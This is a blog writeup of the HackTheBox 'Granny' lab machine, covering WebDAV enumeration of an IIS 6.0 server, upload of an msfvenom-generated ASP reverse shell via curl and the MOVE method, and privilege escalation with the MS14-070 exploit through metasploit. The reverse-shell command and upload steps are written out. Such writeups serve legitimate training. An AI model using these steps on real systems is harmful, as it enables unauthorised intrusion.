---
layout: single
title:  "HackTheBox: Granny - Writeup"
date:   2019-04-20 12:00:02 +0530
author: Kyle Simmons
categories: [htb]
---
HackTheBox: Granny was another easy machine to get into, Privilege escalation was problematic but it was a
good lesson on how to deal with broken exploits.

<h2>1.1 Enumeration</h2>
I first started by doing a port scan of Granny.
{% highlight shell %}
nmap -sC -sV -A -oA granny-scan 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up (0.035s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Error
| http-webdav-scan:
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unkown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows 2000 SP4 (85%), Microsoft Windows XP SP2 or Windows Server 2003 SP2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   41.97 ms 10.10.14.1
2   42.07 ms 10.10.10.15
{% endhighlight %}
<br>
Visting the website and running dirb revealed that the website is full of inital configuration
files as it appears that the website has not been setup yet or misconfigured. However, the port scan
revealed that http webdav methods can used. A good way to test for this is with `davtest`.
<br>

<img src="/assets/images/htb/granny/davtest.png">
<br>
After looking around online i found a good sources online to use curl for method requests:
<br>
[Webdav curl examples link]

<h2>2.1 Exploitation</h2>
Firstly a shell needs to be generated to upload to the web server. Since the server is running
asp as found in enumeration, an asp shell can be generated through msfvenom.

`msfvenom -p windows/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=PORT -f asp > rshell.asp`
<img src="/assets/images/htb/granny/msfvenom-rshell.png">

Curl is used for sending the reverse shell as a .txt file. Then the MOVE method is used
to change the file extension to `.asp`.

<img src="/assets/images/htb/granny/curl-shell.png">

The shell is initialised with `'curl http://10.10.10.15/rshell.asp'` and a shell appears in the
netcat listener.

<img src="/assets/images/htb/granny/reverse-shell-done.png">

<h2>3.1 Post exploitation</h2>

A `whoami /all` reveals that i do not have a privileged shell, this will require further post enumeration to
get a privileged shell.

<img src="/assets/images/htb/granny/all-users.png">

A `sysinfo` shows that the machine is an old version of windows running `Windows server 2003 SP2`.

<img src="/assets/images/htb/granny/sysinfo.png">

After some research, several local exploits have been found at:

[Local windows exploits link]

The MS14-070 exploit appeared to be what i was looking for. The exploit was put onto the target
machine the same way as the reverse shell. When executing the exploit there was a problem with the
exploit not working properly. The process was running but it was stuck.

<img src="/assets/images/htb/granny/escalted-priv.png">

To solve this, metasploit is used to convert the shell to meterpreter and migrate the process.

Convert shell to meterpreter:
<img src="/assets/images/htb/granny/migrate-to-meterpreter.png">

Execute the exploit in metasploit:
<img src="/assets/images/htb/granny/priv-esc-exploited.png">

`session 3` has been opened and when opening it is a privileged meterpreter shell. The root.txt is found in the
desktop of the Administrator account, and success!

<img src="/assets/images/htb/granny/found-root.png">









[Local windows exploits link]: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070
[Webdav curl examples link]: https://code.blogs.iiidefix.net/posts/webdav-with-curl/
